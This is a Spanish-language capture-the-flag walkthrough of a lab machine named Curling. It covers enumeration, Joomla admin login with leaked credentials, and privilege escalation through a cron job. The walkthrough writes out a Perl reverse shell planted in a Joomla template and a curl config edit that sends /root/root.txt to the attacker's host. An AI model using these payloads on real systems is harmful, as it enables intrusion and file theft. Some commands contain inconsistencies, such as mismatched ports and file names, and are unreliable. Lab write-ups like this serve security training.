Sistema Operativo: Linux
Dificulta: Fasil
IP: 10.10.10.150

Para este equipo utilizaremos la siguiente herramientas

nmap
wfuzz
curl

Fase 1: Enumeracion

El primer paso para explotar un maquina es escanear y realizar un reconocimiento de los puertos y servicios que esta tiene.

# nmap -sC -sV -o scan_curling.txt 10.10.10.150

Aqui encontraremos los siguientes puertos:

22 SSH OpenSSH 7.6p1 Ubuntu 4
80 HTTP Apache httpd 2.4.29

Ahora haremos un reconocimiento a nivel web con wfuzz

wfuzz -c -w /usr/share/dirb/wordlists/common.txt -z list,-.php-.html-.txt --hc 404,403 http://10.10.10.150/FUZZFUZ2Z

Entre la busqueda podemos notar que encontramos

http://10.10.10.150/administrator/ este el panel de joolam
Tambien encontramos:
http://10.10.10.150/secret.txt aqui encontramos unas credenciales.
Q3VybGluZzIwMTgh

Esta clave la convertiremos en base64
# echo Q3VybGluZzIwMTgh | base64 -d
Curling2018!

si volvemo a http://10.10.10.150/ veremos que el primer post dice que fue Floris y tambien se encuentra casi igualita la credenciales que acabamos de encontrar.

por lo que intentaremos utilizar user: floris pass: Curling2018! en la siguiente direccion http://10.10.10.150/administrator/

ahora iremos a Extensions -> Templates -> Templates aqui utilizaremos el primer template removeremos todo y ponemos lo siguiente.

perl -e ‘use Socket;$i=”10.0.14.14″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

Grabamos,  Luego nos pondemos y nos ponemos en modo escucha por dicho puerto

nc -nlvp 44444

ahora solo debemos ejecutar en la web Template Preview. y listo tenemos nuestra shell

Para migrarla a una shell interativa haremos lo siguiente pasos.

python3 -c "import pty;pty.spawn('/bin/bash')"
Crtl-Z
stty raw -echo
reset
fg
export TERM=screen
ahora debemos buscar cual es ancho de nuestra terminal
stty size
ahora volvemos a nuestra shell y ejecutamos
stty rows 27 cols 90

ahora iremos  cd /home/floris
aqui encontraremos 
user.txt
password_backup

como no podemos abrir user.txt, copiaremos password_backup el cual aparenta tener una credenciales a /tmp/

cp password_backup /tmp/.
cd /tmp/
cat password_backup |xxd-r > password.xxd
file password.xdd <para verificar que formato tiene el archivo>
bzip2 -d password.xxd > password
zcat password.bzip2.out <enter>
zcat password.bzip2.out | bzcat <enter>
zcat password.bzip2.out | bzcat | tar -xO <enter> 
5d<wdCbdZu)|hChXll

ahora podemos logueado a curling via ssh con user: floris pass: 5d<wdCbdZu)|hChXll
ssh floris@10.10.10.150
Aqui ya tendriamos la user.txt

ahora nos moveremos al directorio llamada admin-data
y vermos dos archivo input, report.

si nos fijamos en la fecha de crecion de los archivo, notaran que ambos cambian cada un minuto, lo que significa que existe un crontab,
para verificar si se esta realizando con nuestro usuario haremos lo siguiente

crontab -e pero no es asi,

Podemos verificar con una herramienta llamada pspy

Pero para simplicar las cosas. lo que tendremos que hacer es lo siguiente

vi input
url = "http://10.10.14.16"
data="@/root/root.txt"

grabamos y nos ponemos en escucha por el puerto 80

nc -nlvpn 80

Y listo deberiamos tener la flag del root.
